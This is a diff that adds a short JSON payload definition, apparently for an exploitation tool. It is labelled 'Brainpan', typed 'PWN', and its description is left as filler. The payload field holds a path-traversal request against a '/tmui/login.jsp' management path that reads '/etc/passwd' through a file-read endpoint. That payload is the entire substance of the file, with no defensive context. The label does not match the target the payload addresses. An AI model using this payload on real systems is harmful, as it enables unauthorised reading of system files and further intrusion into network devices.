@@ -1,0 +1,7 @@
+{
+"name": "Brainpan",
+"description": " Description filler",
+"type": "PWN",
+"version": "1.0",
+"payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
+}
